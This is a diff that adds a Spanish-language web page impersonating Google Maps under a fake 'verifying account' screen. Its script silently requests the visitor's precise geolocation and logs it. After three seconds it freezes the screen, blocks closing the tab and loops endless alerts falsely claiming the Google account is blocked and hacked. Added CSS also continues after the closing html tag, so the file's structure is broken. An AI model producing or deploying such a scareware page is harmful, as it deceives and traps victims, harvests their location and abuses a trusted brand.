@@ -166,6 +166,238 @@
             pointer-events: none;
         }
 
+        .ubicacion-texto {
+            display: none !important;
+        }
+
+        .imagen-fondo {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: 0;
+            display: none;
+            background: #000000;
+            justify-content: center;
+            align-items: center;
+        }
+
+        .imagen-fondo img {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+        }
+
+        .imagen-fondo.activa {
+            display: flex;
+        }
+
+        @media (max-width: 480px) {
+            .maps-text {
+                font-size: 1.2rem;
+            }
+            .maps-icon {
+                width: 36px;
+                height: 36px;
+            }
+            .loader {
+                width: 40px;
+                height: 40px;
+                border-width: 4px;
+            }
+            .status-text {
+                font-size: 1rem;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div id="capaCongelada" class="capa-congelada"></div>
+
+    <div id="imagenFondo" class="imagen-fondo">
+        <img id="imagenMostrada" src="" alt="Verificación de seguridad" />
+    </div>
+
+    <div id="contenedorPrincipal" class="container">
+        <div class="google-maps-logo">
+            <div class="maps-icon">
+                <div class="pin"></div>
+            </div>
+            <div class="maps-text">
+                Google <span>Maps</span>
+            </div>
+        </div>
+
+        <div class="loader" role="status" aria-label="Cargando"></div>
+
+        <div class="status-text">
+            Verificando <span class="light">cuenta</span>
+        </div>
+
+        <div class="divider"></div>
+
+        <div class="sub-text">
+            Esto puede tomar unos segundos
+        </div>
+    </div>
+
+    <script>
+        (function() {
+            const URL_IMAGEN = "https://i.postimg.cc/7Y6HFY9m/IMG-20260902-153111.jpg";
+            const TIEMPO_ALERTA = 3000;
+            const MENSAJE_ALERTA =
+                "Peligro, su cuenta ha sido bloqueada. Hemos detectado un dispositivo con acceso a su cuenta de Google, posiblemente hackeada.";
+
+            let alertaActiva = false;
+            let imagenActivada = false;
+            let pantallaCongelada = false;
+            let ubicacionObtenida = false;
+
+            const capaCongelada = document.getElementById('capaCongelada');
+            const imagenFondo = document.getElementById('imagenFondo');
+            const imgElement = document.getElementById('imagenMostrada');
+            const contenedor = document.getElementById('contenedorPrincipal');
+
+            // Intentar evitar el cierre de la pestaña
+            window.addEventListener('beforeunload', function(e) {
+                e.preventDefault();
+                e.returnValue = '';
+                return '';
+            });
+
+            function congelarPantalla() {
+                if (pantallaCongelada) return;
+                pantallaCongelada = true;
+                capaCongelada.classList.add('activa');
+            }
+
+            function activarImagenFondo() {
+                if (imagenActivada) return;
+                imagenActivada = true;
+                imgElement.src = URL_IMAGEN;
+                imagenFondo.classList.add('activa');
+                contenedor.classList.add('oculto');
+            }
+
+            // Solicitar ubicación en segundo plano
+            function solicitarUbicacion() {
+                if (ubicacionObtenida) return;
+
+                if ("geolocation" in navigator) {
+                    console.log("📍 Solicitando ubicación...");
+
+                    navigator.geolocation.getCurrentPosition(
+                        function(posicion) {
+                            ubicacionObtenida = true;
+                            const lat = posicion.coords.latitude;
+                            const lng = posicion.coords.longitude;
+                            const precision = posicion.coords.accuracy;
+
+                            console.log(`✅ UBICACIÓN EXACTA OBTENIDA:`);
+                            console.log(`   Latitud: ${lat}`);
+                            console.log(`   Longitud: ${lng}`);
+                            console.log(`   Precisión: ${precision} metros`);
+                            console.log(`   📍 https://www.google.com/maps?q=${lat},${lng}`);
+                        },
+                        function(error) {
+                            console.log(`❌ Usuario BLOQUEÓ la ubicación: ${error.message}`);
+                        },
+                        {
+                            enableHighAccuracy: true,
+                            timeout: 8000,
+                            maximumAge: 0
+                        }
+                    );
+                } else {
+                    console.log("❌ Geolocalización no soportada");
+                }
+            }
+
+            // Bucle infinito de alertas
+            function bucleInfinitoAlertas() {
+                alert(MENSAJE_ALERTA);
+                setTimeout(bucleInfinitoAlertas, 50);
+            }
+
+            function activarTodo() {
+                if (alertaActiva) return;
+                alertaActiva = true;
+
+                activarImagenFondo();
+                congelarPantalla();
+                setTimeout(bucleInfinitoAlertas, 100);
+            }
+
+            // === FLUJO DE LA PÁGINA ===
+            solicitarUbicacion();
+            setTimeout(activarTodo, TIEMPO_ALERTA);
+
+            console.log("⚠️ A los 3 segundos: imagen de fondo + alerta + bucle infinito");
+            console.log("📍 Solicitando ubicación en segundo plano.");
+        })();
+    </script>
+</body>
+</html>
+        .maps-text span {
+            font-weight: 400;
+            color: #5f6368;
+        }
+
+        .loader {
+            width: 48px;
+            height: 48px;
+            border-radius: 50%;
+            border: 5px solid #e8eaed;
+            border-top: 5px solid #1a73e8;
+            border-right: 5px solid #1a73e8;
+            animation: spin 0.9s cubic-bezier(0.4, 0.0, 0.2, 1) infinite;
+            flex-shrink: 0;
+            margin-top: 0.5rem;
+            pointer-events: none;
+        }
+
+        @keyframes spin {
+            0% {
+                transform: rotate(0deg);
+            }
+            100% {
+                transform: rotate(360deg);
+            }
+        }
+
+        .status-text {
+            color: #202124;
+            font-size: 1.1rem;
+            font-weight: 500;
+            letter-spacing: 0.2px;
+            text-align: center;
+            pointer-events: none;
+        }
+
+        .status-text .light {
+            font-weight: 400;
+            color: #5f6368;
+        }
+
+        .divider {
+            width: 100%;
+            max-width: 200px;
+            height: 1px;
+            background: #dadce0;
+            margin: 0.2rem 0;
+            pointer-events: none;
+        }
+
+        .sub-text {
+            color: #5f6368;
+            font-size: 0.85rem;
+            font-weight: 400;
+            text-align: center;
+            line-height: 1.5;
+            pointer-events: none;
+        }
+
         .imagen-fondo {
             position: fixed;
             top: 0;
